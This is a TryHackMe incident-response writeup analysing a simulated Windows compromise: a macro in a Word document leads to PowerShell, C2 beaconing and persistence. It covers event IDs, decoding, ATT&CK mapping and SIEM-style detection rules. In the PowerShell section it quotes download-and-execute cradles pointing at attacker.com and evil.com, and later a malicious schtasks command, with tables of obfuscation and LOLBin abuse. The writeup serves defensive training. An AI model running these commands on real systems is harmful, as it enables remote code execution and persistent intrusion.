# 🌩️ Tempest Incident — TryHackMe Writeup

**📅 Day 130 — 365 Days of Cybersecurity**
**✅ Status: Completed**
**🏷️ Tags:** `Incident Response` `DFIR` `Windows` `PowerShell` `Threat Hunting` `SOC`

---

## 🧠 Overview

In this room I investigated a realistic security incident on a compromised Windows environment. The goal was to follow a complete **Digital Forensics and Incident Response (DFIR)** workflow: from the detection of the initial alert all the way to a full reconstruction of the attacker's timeline.

> **Key concept:** Incident response is not just about detecting malware.  
> It's about answering three fundamental questions:  
> **What happened? How did it happen? What did the attacker achieve?**

---

## 🎯 Learning Objectives

- Investigate a Windows security incident end-to-end
- Analyze system telemetry to reconstruct attacker behavior
- Correlate process, network, and authentication events
- Identify execution and persistence techniques (MITRE ATT&CK)
- Reconstruct a coherent attack timeline

---

## 🚨 Initial Incident Investigation

The scenario starts with a **suspicious activity alert** on a Windows host. The first step in any IR engagement is to define the scope before diving deeper.

### Initial investigator questions

| Question | Why it matters |
|---|---|
| What is the initial access vector? | Defines the attacker's entry point |
| What commands were executed? | Reveals intent and capabilities |
| What additional systems are affected? | Determines the scope of compromise |
| Are there persistence mechanisms? | Indicates if the attacker is still active |
| Was there data exfiltration? | Assesses the real impact |

---

## 🔍 Windows Telemetry Analysis

Windows generates a large amount of telemetry that, when properly interpreted, allows you to reconstruct almost any attacker action.

### Primary evidence sources

```
C:\Windows\System32\winevt\Logs\
├── Security.evtx          → Authentication, object access, policy
├── System.evtx            → OS and service events
├── Application.evtx       → Application errors
└── Microsoft-Windows-PowerShell%4Operational.evtx → PowerShell logs
```

### Critical Event IDs in IR

| Event ID | Channel | Description |
|---|---|---|
| `4624` | Security | Successful logon |
| `4625` | Security | Failed authentication |
| `4688` | Security | New process created |
| `4698` | Security | Scheduled task created |
| `4720` | Security | User account created |
| `7045` | System | New service installed |
| `4104` | PowerShell | Script block logging (script content) |
| `4103` | PowerShell | Module logging (pipelines and commands) |

> **SOC Insight:** Event ID `4688` with command-line auditing enabled is one of the most valuable IR artifacts — it logs the parent process, child process, and exact command-line arguments used.

---

## ⚙️ Malicious PowerShell Analysis

PowerShell was the central artifact in this investigation. It's the most abused offensive tool in Windows environments for a clear reason: it's installed by default, trusted by the OS, and allows in-memory execution.

### Suspicious PowerShell indicators

```powershell
# Execution policy bypass
powershell.exe -ExecutionPolicy Bypass -File script.ps1

# Base64-encoded command (obfuscation)
powershell.exe -EncodedCommand <BASE64_PAYLOAD>
# Decoded example:
# [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('...'))

# Download cradle — downloads and executes in memory without touching disk
powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"

# Another common download cradle
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://evil.com/shell.exe','C:\Users\Public\shell.exe')"
```

### How to decode a Base64 payload during investigation

```powershell
# In PowerShell (during forensic analysis)
$encoded = "JABjAGwAaQBlAG4AdA..."
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))

# On Linux/bash
echo "JABjAGwAaQBlAG4AdA==" | base64 -d | iconv -f utf-16le -t utf-8
```

### Common obfuscation techniques

| Technique | Example |
|---|---|
| String concatenation | `"po"+"wer"+"shell"` |
| Backtick escaping | `` `i`e`x `` |
| Variable substitution | `$env:ComSpec[8,15,25]-join''` |
| Invoke-Expression aliases | `iex`, `&`, `.` operator |
| Character casting | `[char]73+[char]69+[char]88` |

> **Defensive note:** Enabling **Script Block Logging** (Event 4104) captures script content **after de-obfuscation**, making it an invaluable evidence source even against heavily obfuscated payloads.

---

## 🔗 Process Tree Analysis

The process tree (process lineage) is arguably the most revealing artifact in an investigation. An unexpected parent-child relationship almost always indicates malicious activity.

### Observed execution chain

```
winlogon.exe (PID 512)
└── explorer.exe (PID 2048)
    └── WINWORD.EXE (PID 3104)   ← Word document opened by user
        └── powershell.exe (PID 4412)   ← ⚠️ ANOMALY: Office spawning shell
            └── cmd.exe (PID 5520)
                └── net.exe (PID 6104)   ← Network reconnaissance
```

### Why this chain is suspicious

Office applications should **never** spawn `powershell.exe` or `cmd.exe` during normal operation. This pattern is an almost universal signature of:

- **Malicious macro** in an Office document (T1137)
- **Vulnerability exploitation** in the Office parser
- **Phishing with embedded payload**

### Commonly abused LOLBins

**Living-Off-the-Land Binaries** are legitimate Windows executables used for malicious purposes:

| Binary | Common abuse |
|---|---|
| `mshta.exe` | Execute malicious HTA/JScript |
| `certutil.exe` | Download files or decode Base64 |
| `regsvr32.exe` | Execute remote COM scriptlets (Squiblydoo) |
| `rundll32.exe` | Load malicious DLLs |
| `wscript.exe` / `cscript.exe` | Execute VBScript/JScript |
| `msiexec.exe` | Install remote MSI packages |
| `bitsadmin.exe` | File download/upload |

---

## 🌐 Network Investigation

Network telemetry correlated with process execution helps identify attacker infrastructure and objectives.

### C2 (Command & Control) indicators

```
Suspicious connection detected:
Process:    powershell.exe (PID 4412)
Dest IP:    185.220.101.x (AS: TOR exit node / bulletproof hosting)
Port:       443 (HTTPS — encrypted to evade inspection)
Frequency:  Every 60 seconds ← BEACONING
Bytes out:  ~200 bytes (check-in)
Bytes in:   Variable (commands/payloads)
```

### Beaconing patterns

Beaconing is the periodic communication between a malicious agent and its C2 server. Key characteristics:

- **Regular interval** (e.g., exactly every 60s, 300s, 3600s)
- **Jitter** — modern frameworks like Cobalt Strike add random variation to evade detection
- **Unusual or hardcoded User-Agent**
- **Destination on anonymous hosting** (Tor, VPS in permissive jurisdictions)

### DNS analysis

```
# Suspicious DNS queries to investigate:
update.microsoft-telemetry[.]com   ← Typosquatting of legitimate domain
cdn.windowsupdate[.]xyz            ← Unusual TLD for a supposed MS service
a1b2c3d4.ngrok.io                  ← Legitimate tunnel abused for C2
```

---

## 🧬 Persistence Investigation

Persistence determines whether the attacker can survive a system reboot. Its presence indicates planning and intent to maintain long-term access.

### Investigated mechanisms

**1. Registry Run Keys (T1547.001)**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
```

**2. Scheduled Tasks (T1053.005)**
```powershell
# Malicious task creation (what the attacker executed)
schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -enc <payload>" /sc onlogon /ru SYSTEM

# How to investigate it
schtasks /query /fo LIST /v | findstr /i "task\|run\|status"
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft\*"} | Select-Object TaskName, TaskPath
```

**3. Startup Folder**
```
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
```

**4. Services (T1543.003)**
```
Event ID 7045 — New Service Installed
Service name: "WindowsDefenderUpdate" ← Misleading name
Binary:       C:\Users\Public\svchost32.exe ← Unusual path for a service
```

---

## 🔎 Timeline Reconstruction

Chronological reconstruction is the most important final deliverable in DFIR. It turns isolated events into a coherent narrative of the attack.

### Attack timeline (ATT&CK mapping)

| Timestamp | Event | MITRE Technique |
|---|---|---|
| T+0:00 | User opens Word document with malicious macro | T1566.001 — Spearphishing Attachment |
| T+0:02 | WINWORD.EXE spawns powershell.exe with encoded payload | T1059.001 — PowerShell |
| T+0:03 | PowerShell downloads stage 2 from C2 domain | T1105 — Ingress Tool Transfer |
| T+0:05 | In-memory payload execution (fileless) | T1620 — Reflective Code Loading |
| T+0:06 | Internal recon: `whoami`, `net user`, `ipconfig` | T1016, T1033 — Discovery |
| T+0:15 | Scheduled task created for persistence | T1053.005 — Scheduled Task |
| T+0:20 | C2 channel established (beaconing every 60s) | T1071.001 — Web Protocols |
| T+0:45 | Lateral movement begins (authentication attempts) | T1021 — Remote Services |

### Correlation methodology: the 3-pivot rule

In IR, every artifact should generate at least 3 investigation pivots:

```
Suspicious IP → What process connected to it? → When was that process created?
                                               → Where was it launched from?
                                               → What files did it touch afterward?
```

---

## 🚨 Indicators of Compromise (IoCs)

### Process-based
- `powershell.exe` with `-enc` or `-EncodedCommand` argument
- `WINWORD.EXE` / `EXCEL.EXE` as parent process of a shell
- Processes launched from non-standard paths (`C:\Users\Public\`, `C:\Temp\`)
- `cmd.exe` spawned by productivity applications

### Network-based
- Outbound connections from `powershell.exe` to external IPs
- Beaconing at regular intervals (review NetFlow/PCAP)
- DNS queries to recently registered domains (< 30 days)
- Non-standard ports or tunnels over HTTPS/DNS

### Persistence-based
- New `Run` key entries unrelated to installed software
- Scheduled tasks outside `\Microsoft\` paths
- Services with binaries in user paths (`C:\Users\`)
- Unrecognized files in Startup folders

---

## 🛡️ Detection Opportunities

### Proposed detection rules (pseudo-SIEM format)

```sql
-- Encoded PowerShell
EventID = 4688 AND
CommandLine CONTAINS ("-enc" OR "-EncodedCommand" OR "-ec") AND
NewProcessName LIKE "%powershell%"

-- Office spawning shell
EventID = 4688 AND
ParentProcessName IN ("WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE") AND
NewProcessName IN ("powershell.exe", "cmd.exe", "wscript.exe", "mshta.exe")

-- Scheduled task creation
EventID = 4698 AND
TaskContent CONTAINS ("powershell" OR "cmd" OR "wscript" OR "mshta")

-- Beaconing detection (requires NetFlow)
DestinationIP NOT IN (whitelist) AND
ConnectionInterval BETWEEN 55 AND 65 seconds AND  -- 60s ± jitter
BytesSent < 500                                    -- small check-in
```

---

## 🧪 DFIR Concepts Practiced

- Full Incident Response lifecycle (Preparation → Detection → Containment → Eradication → Recovery)
- Windows Event Log analysis and Event ID correlation
- Decoding and analyzing obfuscated PowerShell payloads
- Process tree analysis and parent-child anomaly detection
- LOLBin identification and fileless techniques
- Network forensics: beaconing and C2 analysis
- Mapping techniques to the MITRE ATT&CK framework
- Building a forensic timeline

---

## 🛠️ Tools & Resources

| Tool | Use |
|---|---|
| **Event Viewer / evtx** | Windows Event Log analysis |
| **Sysmon** | Enriched process and network telemetry |
| **Wireshark / tcpdump** | Network traffic analysis |
| **CyberChef** | Payload decoding (Base64, XOR, etc.) |
| **MITRE ATT&CK Navigator** | Technique mapping |
| **Volatility** | RAM/memory analysis |
| **Timeline Explorer** | Temporal artifact correlation |
| **VirusTotal / AnyRun** | IOC analysis and sandboxing |

---

## 🧠 Key Takeaways

1. **Correlation is everything.** An isolated event rarely tells the full story. The value lies in the chain of correlated events.

2. **PowerShell is a double-edged sword.** Legitimate for admins, powerful for attackers. The answer isn't to disable it — it's to instrument it: Script Block Logging + Constrained Language Mode + AMSI.

3. **The process tree never lies.** An anomalous parent-child relationship is almost always an indicator of compromise, regardless of whether the child process is a legitimate binary.

4. **The timeline is the most valuable deliverable.** It allows management to understand what happened without technical knowledge, and helps the IR team prioritize the response.

5. **Fileless doesn't mean traceless.** In-memory attacks still leave evidence in Event Logs, Prefetch files, network records, and OS artifacts.

6. **MITRE ATT&CK turns findings into a universal language.** Mapping each identified technique enables precise communication and comparison against known threat actors.

---

## 📌 Final Thoughts

This room was a solid IR exercise in a Windows environment, covering the complete workflow that a SOC Tier 2 / junior DFIR analyst would face in a real incident. The most valuable aspect was practicing the **correlation mindset**: not hunting for artifacts in isolation, but building a coherent narrative that explains the attacker's complete behavior.

The simulated incident type — malicious Office macro → PowerShell → C2 → persistence — remains one of the most common vectors in the real world, seen in campaigns from groups like APT29, FIN7, and numerous ransomware operators, making this exercise especially relevant.

